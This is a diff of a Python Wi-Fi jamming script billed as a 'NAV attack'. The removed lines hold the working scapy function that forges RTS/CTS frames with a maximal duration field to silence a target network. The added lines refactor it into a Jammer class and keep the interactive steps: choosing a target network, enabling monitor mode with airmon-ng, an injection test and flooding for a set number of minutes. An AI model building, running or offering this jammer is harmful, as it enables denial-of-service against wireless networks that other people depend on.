@@ -1,60 +1,25 @@
-from scapy.all import *
-from wifi import Cell
-import time
-from wireless import Wireless
-import os
-import sys
-from subprocess import Popen, PIPE
-
-DN = open(os.devnull, 'w')
-
-# Network scanner
-def network_scan():
-    wifi_card = Wireless()
-    interface = wifi_card.interface()
-    wifi_collect = Cell.all(interface)
-    print ("Available networks scan in progress ...")
-    print ("#" * 70)
-    bssid = []
-    time.sleep(2)
-    numero = 0
-    for wi in wifi_collect:
-        print("Network number: " + str(numero))
-        print("SSID: " + wi.ssid)
-        print("BSSID: " + wi.address)
-        print("Channel: " + str(wi.channel))
-        #print("Quality: " + str(wi.quality))
-        print("+-" * 10)
-        bssid.append(wi.address)
-        time.sleep(0.5)
-        numero += 1
-    print ("#" * 70)
-    return bssid
-
-def jam(address, card, card_mac, sub, time):
-    conf.verb = 0
-    if sub == 'rts':
-        packet = RadioTap()/Dot11(type=1,subtype=11,addr1=address,addr2=card_mac,addr3=address, ID=0xFF7F)
-    else:
-        packet= RadioTap()/Dot11(type=1,subtype=12,addr1=address, addr2=card_mac, ID=0xFF7F)
-    packet.show()
-    print(time)
-    print("Jamming network: " + address + " through: " + card + " interface: " + card_mac)
-    sendp(packet, iface = card, count=time, inter=0.032767)
-    #Stop monitor mode
-    subprocess.call('airmon-ng stop {}'.format(card), stdout=FNULL, stderr=subprocess.STDOUT, shell=True)
-    print('\nEnd of jammer. Probably you will have to reboot your computer if your network card does not work correctly')
+import sys, os, subprocess
+sys.path.append(".")
+from src.jammer import Jammer
 
 if __name__ == "__main__":
 
+    jammer = Jammer()
+
+    subprocess.Popen('figlet "NAV attack"', shell=True)
+
     FNULL = open(os.devnull, 'w')
 
-    bssid = network_scan()
+    bssid = jammer.network_scan()
 
     red = input("Tell me the network number you want to jam: ")
 
+    print("+-" * 40)
+
     #Call airmon-ng to show the user a list of available network cards on their device
     subprocess.call('airmon-ng', shell=True)
+
+    print("+-" * 40)
 
     #Select a network card
     networkCard = input('Please enter the name of the network card you wish to use: ')
@@ -65,28 +30,36 @@ if __name__ == "__main__":
     #Start monitor mode on the selected device and run 'airmon-ng check kill' to kill of any process that may be interfering with the network card
     subprocess.call('airmon-ng start {}'.format(networkCard), stdout=FNULL, stderr=subprocess.STDOUT, shell=True)
 
+    print("+-" * 40)
+
     #Call airmon-ng to show the user a list of available network cards on their device
     subprocess.call('airmon-ng', shell=True)
+
+    print("+-" * 40)
 
     #Select a monitor mode network card
     card = input('Please enter the name of the monitor mode network card you wish to use: ')
 
+    print("+-" * 40)
+
     #Time you want to jam
-    time = input('Tell me how much time do you want to jam in minutes: ')
+    time = input('Tell me how much time do you want to jam in minutes Remember that you will be able to stop the Jammer when you want doing ctrl + c: ')
 
-    time = int(time)
+    print("+-" * 40)
 
-    time = (60*time)/0.032767
+    time = jammer.calcule_time(time)
 
-    time = int(time)
-
-    card_mac = subprocess.Popen('ifdata -ph {}'.format(card), stdout=PIPE, shell=True).stdout
-    card_mac = card_mac.read()
-    card_mac = card_mac.decode()
+    card_mac = jammer.get_mac(card)
 
     #injection test before inject RTS/CTS paquets in the network
-    print("Testing your card, wait a moment.")
-    subprocess.call('aireplay-ng --test {}'.format(card), stdout=FNULL, stderr=subprocess.STDOUT, shell=True)
+    print("Testing your card, wait a moment. You can stop it doing ctrl + c.")
+    try:
+        i = 0
+        while i < 2:
+            subprocess.call('aireplay-ng --test {}'.format(card), stdout=FNULL, stderr=subprocess.STDOUT, shell=True)
+            i = i + 1
+    except KeyboardInterrupt:
+        pass
     sub = ''
 
     while sub != 'rts' and sub != 'cts':
@@ -96,4 +69,4 @@ if __name__ == "__main__":
 
     bssid_selected = bssid[int(red)]
 
-    jam(bssid[int(red)], card, card_mac , sub, time)
+    jammer.jam_nav(bssid[int(red)], card, card_mac , sub, time)
